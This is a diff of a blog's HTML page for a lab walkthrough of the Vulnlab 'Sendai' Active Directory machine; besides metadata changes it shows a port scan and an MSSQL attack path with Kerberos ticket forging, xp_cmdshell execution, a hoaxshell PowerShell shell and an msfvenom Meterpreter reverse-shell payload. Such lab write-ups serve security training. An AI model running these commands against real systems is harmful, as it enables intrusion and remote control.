@@ -6,31 +6,32 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="Vulnlab Sendai: Active Directory Certificate Services Penetration Testing WalkthroughThis comprehensive Vulnlab walkthrough documents my methodical approach to compromising the Sendai Active Directory">
+    <meta name="description" content="VL-Sendai: Active Directory Certificate Services Penetration Testing WalkthroughThis comprehensive Vulnlab - Hack The Box walkthrough documents my methodical approach to compromising the Sendai Active">
 <meta property="og:type" content="article">
 <meta property="og:title" content="VL-Sendai">
-<meta property="og:url" content="https://panosoikogr.github.io/2025/04/08/VL-Sendai/index.html">
+<meta property="og:url" content="http://example.com/2025/04/08/VL-Sendai/index.html">
 <meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
-<meta property="og:description" content="Vulnlab Sendai: Active Directory Certificate Services Penetration Testing WalkthroughThis comprehensive Vulnlab walkthrough documents my methodical approach to compromising the Sendai Active Directory">
+<meta property="og:description" content="VL-Sendai: Active Directory Certificate Services Penetration Testing WalkthroughThis comprehensive Vulnlab - Hack The Box walkthrough documents my methodical approach to compromising the Sendai Active">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Sendai/null_ses.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Sendai/sendai_share.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Sendai/weak_pass_users.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Sendai/ellio_shares.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Sendai/firts_pth.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Sendai/sql_svc_hash.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Sendai/not_cracked.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Sendai/confi_share.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Sendai/gmsadump.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Sendai/add_workstasions.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Sendai/ca_operators.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Sendai/esc01.png">
-<meta property="article:published_time" content="2025-04-08T20:22:30.000Z">
-<meta property="article:modified_time" content="2025-05-21T06:38:58.780Z">
+<meta property="og:image" content="http://example.com/images/Sendai/null_ses.png">
+<meta property="og:image" content="http://example.com/images/Sendai/sendai_share.png">
+<meta property="og:image" content="http://example.com/images/Sendai/weak_pass_users.png">
+<meta property="og:image" content="http://example.com/images/Sendai/ellio_shares.png">
+<meta property="og:image" content="http://example.com/images/Sendai/firts_pth.png">
+<meta property="og:image" content="http://example.com/images/Sendai/sql_svc_hash.png">
+<meta property="og:image" content="http://example.com/images/Sendai/not_cracked.png">
+<meta property="og:image" content="http://example.com/images/Sendai/confi_share.png">
+<meta property="og:image" content="http://example.com/images/Sendai/gmsadump.png">
+<meta property="og:image" content="http://example.com/images/Sendai/add_workstasions.png">
+<meta property="og:image" content="http://example.com/images/Sendai/ca_operators.png">
+<meta property="og:image" content="http://example.com/images/Sendai/esc01.png">
+<meta property="article:published_time" content="2025-04-08T04:00:00.000Z">
+<meta property="article:modified_time" content="2025-10-13T10:33:52.659Z">
 <meta property="article:author" content="Panosoiko">
-<meta property="article:tag" content="VL">
+<meta property="article:tag" content="Hack The Box">
+<meta property="article:tag" content="VulnLab">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://panosoikogr.github.io/images/Sendai/null_ses.png">
+<meta name="twitter:image" content="http://example.com/images/Sendai/null_ses.png">
     
     
       
@@ -40,12 +41,12 @@
       
       
         
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
         
       
       
         
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/web-app-manifest-192x192.png">
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
         
       
     
@@ -77,7 +78,7 @@
     
 	<!-- mathjax -->
 	
-<meta name="generator" content="Hexo 7.3.0"></head>
+<meta name="generator" content="Hexo 8.0.0"></head>
 
 <body class="max-width mx-auto px3 ltr">
     
@@ -97,7 +98,7 @@
      --><!--
        --><li><a href="/search/">Search</a></li><!--
      --><!--
-       --><li><a href="/tags/">Tags</a></li><!--
+       --><li><a href="/tags/">tags</a></li><!--
      --><!--
        --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
      -->
@@ -107,10 +108,10 @@
     <span id="actions">
       <ul>
         
-        <li><a class="icon" aria-label="Previous post" href="/2025/04/11/VL-Shibuya/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Previous post" href="/2025/04/10/VL-Shibuya/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
-        <li><a class="icon" aria-label="Next post" href="/2025/04/06/VL-Phantom/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Next post" href="/2025/04/05/VL-Phantom/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
@@ -123,24 +124,24 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/04/08/VL-Sendai/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/04/08/VL-Sendai/&text=VL-Sendai"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/04/08/VL-Sendai/&title=VL-Sendai"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/04/08/VL-Sendai/&is_video=false&description=VL-Sendai"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=VL-Sendai&body=Check out this article: https://panosoikogr.github.io/2025/04/08/VL-Sendai/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/04/08/VL-Sendai/&title=VL-Sendai"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/04/08/VL-Sendai/&title=VL-Sendai"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/04/08/VL-Sendai/&title=VL-Sendai"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/04/08/VL-Sendai/&title=VL-Sendai"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/04/08/VL-Sendai/&name=VL-Sendai&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/04/08/VL-Sendai/&t=VL-Sendai"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/08/VL-Sendai/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/08/VL-Sendai/&text=VL-Sendai"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/08/VL-Sendai/&title=VL-Sendai"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/08/VL-Sendai/&is_video=false&description=VL-Sendai"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Sendai&body=Check out this article: http://example.com/2025/04/08/VL-Sendai/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/08/VL-Sendai/&title=VL-Sendai"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/08/VL-Sendai/&title=VL-Sendai"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/08/VL-Sendai/&title=VL-Sendai"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/08/VL-Sendai/&title=VL-Sendai"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/08/VL-Sendai/&name=VL-Sendai&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/08/VL-Sendai/&t=VL-Sendai"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnlab-Sendai-Active-Directory-Certificate-Services-Penetration-Testing-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Vulnlab Sendai: Active Directory Certificate Services Penetration Testing Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Reconnaissance</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">SMB Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Enumeration"><span class="toc-number">1.3.</span> <span class="toc-text">User Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Share-Access"><span class="toc-number">1.4.</span> <span class="toc-text">Share Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Spray-and-Reset"><span class="toc-number">1.5.</span> <span class="toc-text">Password Spray and Reset</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Enumeration-with-BloodHound"><span class="toc-number">1.6.</span> <span class="toc-text">Domain Enumeration with BloodHound</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberoasting"><span class="toc-number">1.7.</span> <span class="toc-text">Kerberoasting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploring-Shares"><span class="toc-number">1.8.</span> <span class="toc-text">Exploring Shares</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gMSA-Password-Extraction"><span class="toc-number">1.9.</span> <span class="toc-text">gMSA Password Extraction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">1.10.</span> <span class="toc-text">Privilege Escalation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ADCS-ESC4-Exploitation"><span class="toc-number">1.11.</span> <span class="toc-text">ADCS ESC4 Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Alternative-Path-MSSQL-Server-Exploitation"><span class="toc-number">1.12.</span> <span class="toc-text">Alternative Path: MSSQL Server Exploitation</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#VL-Sendai-Active-Directory-Certificate-Services-Penetration-Testing-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">VL-Sendai: Active Directory Certificate Services Penetration Testing Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Reconnaissance</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">SMB Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Enumeration"><span class="toc-number">1.3.</span> <span class="toc-text">User Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Share-Access"><span class="toc-number">1.4.</span> <span class="toc-text">Share Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Spray-and-Reset"><span class="toc-number">1.5.</span> <span class="toc-text">Password Spray and Reset</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Enumeration-with-BloodHound"><span class="toc-number">1.6.</span> <span class="toc-text">Domain Enumeration with BloodHound</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberoasting"><span class="toc-number">1.7.</span> <span class="toc-text">Kerberoasting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploring-Shares"><span class="toc-number">1.8.</span> <span class="toc-text">Exploring Shares</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gMSA-Password-Extraction"><span class="toc-number">1.9.</span> <span class="toc-text">gMSA Password Extraction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">1.10.</span> <span class="toc-text">Privilege Escalation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ADCS-ESC4-Exploitation"><span class="toc-number">1.11.</span> <span class="toc-text">ADCS ESC4 Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Alternative-Path-MSSQL-Server-Exploitation"><span class="toc-number">1.12.</span> <span class="toc-text">Alternative Path: MSSQL Server Exploitation</span></a></li></ol></li></ol>
       </div>
     
   </span>
@@ -165,7 +166,7 @@
       
     <div class="postdate">
       
-        <time datetime="2025-04-08T20:22:30.000Z" class="dt-published" itemprop="datePublished">2025-04-08</time>
+        <time datetime="2025-04-08T04:00:00.000Z" class="dt-published" itemprop="datePublished">2025-04-08</time>
         
       
     </div>
@@ -176,7 +177,7 @@
       
     <div class="article-tag">
         <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/VL/" rel="tag">VL</a>
+        <a class="p-category" href="/tags/Hack-The-Box/" rel="tag">Hack The Box</a>, <a class="p-category" href="/tags/VulnLab/" rel="tag">VulnLab</a>
     </div>
 
 
@@ -185,7 +186,7 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h1 id="Vulnlab-Sendai-Active-Directory-Certificate-Services-Penetration-Testing-Walkthrough"><a href="#Vulnlab-Sendai-Active-Directory-Certificate-Services-Penetration-Testing-Walkthrough" class="headerlink" title="Vulnlab Sendai: Active Directory Certificate Services Penetration Testing Walkthrough"></a>Vulnlab Sendai: Active Directory Certificate Services Penetration Testing Walkthrough</h1><p>This comprehensive Vulnlab walkthrough documents my methodical approach to compromising the Sendai Active Directory environment. Beginning with initial reconnaissance and SMB enumeration, I discovered an opportunity to reset expired passwords, providing the initial foothold. Through systematic privilege escalation leveraging gMSA password extraction, service account credential exposure, and ultimately Active Directory Certificate Services (ADCS) exploitation via ESC4 vulnerability, I achieved domain administrator access. This penetration testing guide demonstrates practical techniques for exploiting common misconfigurations in enterprise environments, including password policy weaknesses, excessive group permissions, and vulnerable certificate templates. As an alternative attack path, I’ve also included MSSQL server exploitation techniques, showing the versatility of approaches available to security professionals when assessing Active Directory infrastructures.</p>
+    <h1 id="VL-Sendai-Active-Directory-Certificate-Services-Penetration-Testing-Walkthrough"><a href="#VL-Sendai-Active-Directory-Certificate-Services-Penetration-Testing-Walkthrough" class="headerlink" title="VL-Sendai: Active Directory Certificate Services Penetration Testing Walkthrough"></a>VL-Sendai: Active Directory Certificate Services Penetration Testing Walkthrough</h1><p>This comprehensive Vulnlab - Hack The Box walkthrough documents my methodical approach to compromising the Sendai Active Directory environment. Beginning with initial reconnaissance and SMB enumeration, I discovered an opportunity to reset expired passwords, providing the initial foothold. Through systematic privilege escalation leveraging gMSA password extraction, service account credential exposure, and ultimately Active Directory Certificate Services (ADCS) exploitation via ESC4 vulnerability, I achieved domain administrator access. This penetration testing guide demonstrates practical techniques for exploiting common misconfigurations in enterprise environments, including password policy weaknesses, excessive group permissions, and vulnerable certificate templates. As an alternative attack path, I’ve also included MSSQL server exploitation techniques, showing the versatility of approaches available to security professionals when assessing Active Directory infrastructures.</p>
 <h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><p>Our first step was to perform a port scan to identify available services:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Not shown: 65518 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-08 12:50:51Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">443/tcp   open  ssl/http      syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=dc.sendai.vl</span><br><span class="line">49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49669/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">55350/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">55738/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">55770/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">55774/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br></pre></td></tr></table></figure>
 
@@ -254,14 +255,29 @@
 <h2 id="Alternative-Path-MSSQL-Server-Exploitation"><a href="#Alternative-Path-MSSQL-Server-Exploitation" class="headerlink" title="Alternative Path: MSSQL Server Exploitation"></a>Alternative Path: MSSQL Server Exploitation</h2><p>An alternative path involves accessing the SQL server via a proxy to expose the MSSQL port to our machine. This approach uses the following steps:</p>
 <ol>
 <li>Use ligolo or chisel to expose the MSSQL port</li>
-<li>Create a Kerberos ticket for the Administrator:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ticketer.py -spn MSSQL/dc.sendai.vl -domain-sid S-1-5-21-3085872742-570972823-736764132 -nthash [MSSQL-HASH] -dc-ip dc.sendai.vl Administrator -domain sendai.vl</span><br><span class="line">export KRB5CCNAME=Administrator.ccache</span><br></pre></td></tr></table></figure></li>
-<li>Connect to the SQL server with the ticket:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">impacket-mssqlclient dc.sendai.vl -k</span><br><span class="line">enable_xp_cmdshell</span><br></pre></td></tr></table></figure></li>
-<li>Set up a command shell to establish remote access:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hoaxshell -s ip --p 4444</span><br></pre></td></tr></table></figure></li>
-<li>Execute the shell command:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_cmdshell &#x27;powershell -e &lt;hoaxshell&gt;&#x27;</span><br></pre></td></tr></table></figure></li>
-<li>Create and upload a Meterpreter shell:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=ip LPORT=443 -f exe -o shell.exe</span><br></pre></td></tr></table></figure></li>
+<li>Create a Kerberos ticket for the Administrator:</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ticketer.py -spn MSSQL/dc.sendai.vl -domain-sid S-1-5-21-3085872742-570972823-736764132 -nthash [MSSQL-HASH] -dc-ip dc.sendai.vl Administrator -domain sendai.vl</span><br><span class="line">export KRB5CCNAME=Administrator.ccache</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>Connect to the SQL server with the ticket:</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">impacket-mssqlclient dc.sendai.vl -k</span><br><span class="line">enable_xp_cmdshell</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>Set up a command shell to establish remote access:</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hoaxshell -s ip --p 4444</span><br></pre></td></tr></table></figure>
+<ol start="5">
+<li>Execute the shell command:</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_cmdshell &#x27;powershell -e &lt;hoaxshell&gt;&#x27;</span><br></pre></td></tr></table></figure>
+<ol start="6">
+<li>Create and upload a Meterpreter shell:</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=ip LPORT=443 -f exe -o shell.exe</span><br></pre></td></tr></table></figure>
+<ol start="7">
 <li>After getting a Meterpreter session, simply run <code>getsystem</code> to escalate privileges.</li>
 </ol>
-<p><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=9b6979e9-cbac-4893-8a52-68def2ae889f" title="https://api.vulnlab.com/api/v1/share?id=9b6979e9-cbac-4893-8a52-68def2ae889f">https://api.vulnlab.com/api/v1/share?id=9b6979e9-cbac-4893-8a52-68def2ae889f</a></p>
+<p><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=9b6979e9-cbac-4893-8a52-68def2ae889f" title="https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;9b6979e9-cbac-4893-8a52-68def2ae889f">https://api.vulnlab.com/api/v1/share?id=9b6979e9-cbac-4893-8a52-68def2ae889f</a></p>
 
   </div>
 </article>
@@ -283,7 +299,7 @@
         
           <li><a href="/search/">Search</a></li>
         
-          <li><a href="/tags/">Tags</a></li>
+          <li><a href="/tags/">tags</a></li>
         
           <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
         
@@ -293,23 +309,23 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnlab-Sendai-Active-Directory-Certificate-Services-Penetration-Testing-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Vulnlab Sendai: Active Directory Certificate Services Penetration Testing Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Reconnaissance</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">SMB Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Enumeration"><span class="toc-number">1.3.</span> <span class="toc-text">User Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Share-Access"><span class="toc-number">1.4.</span> <span class="toc-text">Share Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Spray-and-Reset"><span class="toc-number">1.5.</span> <span class="toc-text">Password Spray and Reset</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Enumeration-with-BloodHound"><span class="toc-number">1.6.</span> <span class="toc-text">Domain Enumeration with BloodHound</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberoasting"><span class="toc-number">1.7.</span> <span class="toc-text">Kerberoasting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploring-Shares"><span class="toc-number">1.8.</span> <span class="toc-text">Exploring Shares</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gMSA-Password-Extraction"><span class="toc-number">1.9.</span> <span class="toc-text">gMSA Password Extraction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">1.10.</span> <span class="toc-text">Privilege Escalation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ADCS-ESC4-Exploitation"><span class="toc-number">1.11.</span> <span class="toc-text">ADCS ESC4 Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Alternative-Path-MSSQL-Server-Exploitation"><span class="toc-number">1.12.</span> <span class="toc-text">Alternative Path: MSSQL Server Exploitation</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#VL-Sendai-Active-Directory-Certificate-Services-Penetration-Testing-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">VL-Sendai: Active Directory Certificate Services Penetration Testing Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Reconnaissance</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">SMB Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Enumeration"><span class="toc-number">1.3.</span> <span class="toc-text">User Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Share-Access"><span class="toc-number">1.4.</span> <span class="toc-text">Share Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Spray-and-Reset"><span class="toc-number">1.5.</span> <span class="toc-text">Password Spray and Reset</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Enumeration-with-BloodHound"><span class="toc-number">1.6.</span> <span class="toc-text">Domain Enumeration with BloodHound</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberoasting"><span class="toc-number">1.7.</span> <span class="toc-text">Kerberoasting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploring-Shares"><span class="toc-number">1.8.</span> <span class="toc-text">Exploring Shares</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gMSA-Password-Extraction"><span class="toc-number">1.9.</span> <span class="toc-text">gMSA Password Extraction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">1.10.</span> 